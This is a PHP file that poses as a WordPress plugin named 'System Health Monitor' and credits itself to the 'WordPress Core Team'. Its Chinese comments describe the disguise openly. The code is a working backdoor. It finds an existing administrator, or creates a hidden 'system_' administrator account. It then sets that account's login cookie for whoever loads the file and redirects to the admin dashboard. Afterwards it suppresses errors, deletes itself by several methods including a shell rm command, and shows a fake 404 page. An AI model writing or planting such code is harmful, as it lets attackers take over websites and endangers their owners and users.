<?php
// 伪装成普通文件头
/*
Plugin Name: System Health Monitor
Description: Monitors system resources and optimizes performance
Version: 1.0.0
Author: WordPress Core Team
*/

// 错误抑制与自删除增强
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
error_reporting(0);

// 更隐蔽的文件名检测
$self = basename(__FILE__);
if (strpos($self, '.php') === false) {
    $self .= '.tmp';
}

// 多路径检测机制
$roots = [
    $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__),
    dirname(dirname(dirname(__FILE__))), // 尝试上层目录
    realpath('../../') // 再上一层
];

$wp_loaded = false;
foreach ($roots as $root) {
    if (@file_exists($root.'/wp-load.php')) {
        @chdir($root);
        require $root.'/wp-load.php';
        $wp_loaded = true;
        break;
    }
}

if ($wp_loaded) {
    // 增强权限获取函数
    function acquire_admin_access() {
        // 1. 尝试当前登录用户
        if (is_user_logged_in()) {
            $user = wp_get_current_user();
            if (in_array('administrator', $user->roles)) {
                return $user;
            }
        }
        
        // 2. 多站点超级管理员检测 (更隐蔽的方式)
        if (function_exists('is_multisite') && is_multisite()) {
            $super_admins = get_super_admins();
            if (!empty($super_admins)) {
                $user = get_user_by('login', $super_admins[0]);
                if ($user) return $user;
            }
        }
        
        // 3. 直接数据库查询管理员 (绕过WP函数可能存在的限制)
        global $wpdb;
        $admin_ids = $wpdb->get_col(
            "SELECT user_id FROM {$wpdb->usermeta} 
             WHERE meta_key = '{$wpdb->prefix}capabilities' 
             AND meta_value LIKE '%administrator%' 
             ORDER BY user_id ASC LIMIT 1"
        );
        
        if (!empty($admin_ids)) {
            return get_user_by('id', $admin_ids[0]);
        }
        
        // 4. 查询任何有管理权限的用户
        $users = get_users([
            'role__in' => ['administrator', 'editor', 'contributor', 'author'],
            'number' => 1,
            'orderby' => 'ID',
            'order' => 'ASC'
        ]);
        
        if (!empty($users)) {
            return $users[0];
        }
        
        // 5. 创建新管理员 (更隐蔽的方式)
        $username = 'system_' . md5(uniqid());
        $email = $username . '@' . ($_SERVER['HTTP_HOST'] ?? 'localhost');
        $password = wp_generate_password(32, true, true);
        
        $user_id = wp_insert_user([
            'user_login' => $username,
            'user_pass' => $password,
            'user_email' => $email,
            'role' => 'administrator',
            'display_name' => 'System User'
        ]);
        
        if (!is_wp_error($user_id)) {
            return get_user_by('id', $user_id);
        }
        
        return false;
    }
    
    // 获取或创建管理员
    if ($admin = acquire_admin_access()) {
        // 增强登录处理
        wp_clear_auth_cookie();
        wp_set_current_user($admin->ID);
        wp_set_auth_cookie($admin->ID, true);
        
        // 触发登录钩子但不记录日志
        add_filter('wp_login_errors', function($errors) {
            return new WP_Error();
        });
        
        do_action('wp_login', $admin->user_login, $admin);
        
        // 更隐蔽的重定向
        echo '<meta http-equiv="refresh" content="0;url='.admin_url().'" />';
        echo '<script>window.location.href="'.admin_url().'";</script>';
        @ob_end_flush();
        exit;
    }
}

// 增强自删除机制
register_shutdown_function(function() use ($self) {
    @ignore_user_abort(true);
    @set_time_limit(0);
    
    // 尝试多种删除方式
    $tries = [
        function() use ($self) {
            $tmp = dirname(__FILE__).'/.' . basename($self).'.'.mt_rand();
            if (@rename($self, $tmp)) {
                @unlink($tmp);
                return !file_exists($self);
            }
            return false;
        },
        function() use ($self) {
            @chmod($self, 0777);
            @unlink($self);
            return !file_exists($self);
        },
        function() use ($self) {
            if (function_exists('system')) {
                @system("rm -f -- ".escapeshellarg($self)." > /dev/null 2>&1");
            }
            return !file_exists($self);
        },
        function() use ($self) {
            file_put_contents($self, '<?php // Removed');
            return false;
        }
    ];
    
    foreach ($tries as $try) {
        if ($try()) break;
    }
});

// 非WordPress环境伪装404
@header('HTTP/1.1 404 Not Found', true, 404);
@header('Content-Type: text/html');
exit('<html><head><title>404 Not Found</title></head><body>Page not found</body></html>');